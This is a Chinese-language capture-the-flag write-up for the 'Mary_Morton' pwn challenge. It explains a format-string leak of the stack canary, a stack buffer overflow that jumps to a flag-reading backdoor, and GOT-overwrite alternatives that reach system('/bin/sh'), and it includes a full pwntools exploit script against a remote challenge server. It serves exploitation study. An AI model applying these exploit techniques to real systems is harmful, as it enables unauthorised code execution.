1、准备工作
（1）chmod 777 Mary_Morton
（2）file Mary_Morton
显示：
Mary_Morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
（3）./Mary_Morton
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
发现提示中说明1是栈溢出漏洞，2是格式化字符串漏洞，3是退出程序。
（4）运行checksec：
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
发现有canary开启。
2、思路
1)IDA中查看发现按下2后，调用sub_4008EB()函数，存在格式化字符串漏洞：printf(&buf, &buf);
按下2键，再输入AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p，返回
AAAAAAAA-0x7fff6992ffe0-0x7f-0x7fd54bc555ce-0x1999999999999999-(nil)-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0xa70-(nil)-(nil)-0x674fa3cdd0633d00-0x7fff699300b0-0x4008b8-(nil)-0x7fff699301a8-0x7fff69930198-0x100400730-0x269930190-0x674fa3cdd0633d00-0x400a50-0x7fd54bb8de0b-(nil)-0x7fff69930198
发现偏移量为6字节。(发现我们的输入是从第7个位置开始的，由于下标从0开始，此位置在计算机看来为7 - 1)
2)IDA中查看发现按下1后，调用sub_400960()函数，存在缓冲区溢出漏洞：read(0,&buf,0x100);
buf的大小是0x90,小于第三个参数0x100
3)查找字符串，发现"/bin/cat ./flag"，交叉引用发现后门函数地址为0x4008DA
4)首先利用字符串漏洞，泄露出canary的值，然后在函数要返回的时候再填回去，之后利用栈溢出，让其返回到后门函数
注意：   
	v2 = *MK_FP(__FS__, 40LL);
	return *MK_FP(__FS__, 40LL) ^ v2;
说明使用了canary。
简单介绍canary：启动该机制后，程序会函数开始执行的时候在栈中插入cookie（随机数），函数之后进行验证cookie的正确性，每次程序运行时生成的canary都不相同。x86-64架构下通过fs：0x28来获取这个数据存放在栈中。在退出栈之前，合并栈中的canary值进行检测。
根据上面说明，cookie的值为v2。
注意：
buf和v2相差了0x90-0x8=0x88，0x88/8=17， 17+6（偏移量）=23
因为64位的程序，每个格式化字符串都是8字节，同理32位是4字节
结构如下：
		| stack      |
		| ---------- |
		| 0x88 bytes |
		| Canary     |
		| RBP        |
		| RIP        |
5)构造payload：我们的目的是将canary的值泄漏出来，canary距离buf栈顶的位置相差0x88个字节，%p是将值进行泄漏，前面的位置为17+6，所以paload为：
payload=%23$p，接收到一个十六进制的canary的值。
再次构造payload为：
payload='a'*(0x90-0x8)+p64(canary)+'a'*8+p64(backdoor_addr)
3、exp：
#coding=utf-8
from pwn import *

context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./Mary_Morton')
#p=process('./Mary_Morton')
p=remote('220.249.52.133','52935')

p.sendlineafter('3. Exit the battle','2')
p.sendline('%23$p')
p.recvuntil('0x')

canary=int(p.recv(16),16)
print(canary)

backdoor_addr=0x4008da
payload=0x88*'a'+p64(canary)+8*'a'+p64(backdoor_addr)

p.sendlineafter('3. Exit the battle','1')
p.sendline(payload)
p.interactive()
p.close()

writeup赞最多的第二条和第三条写的不错


1、第二种思路，
方式1:输入2，利用格式化字符串将printf的got地址修改为system的plt地址，再次输入2，输入'/bin/sh\x00'，相当于执行system('/bin/sh\x00')
方式2:输入2，利用格式化字符串将exit的got地址修改为sub_4008DA函数地址（该函数可以直接执行cat./flag）,再次输入3，调用sub_4008DA函数catflag

问题1：writeup中的第三条其他的两种思路的写法
问题2：writeup中第四条中4%23$p的写法
问题3：re.findall(r'\w+\{.+\}', conn.recvuntil('}'))


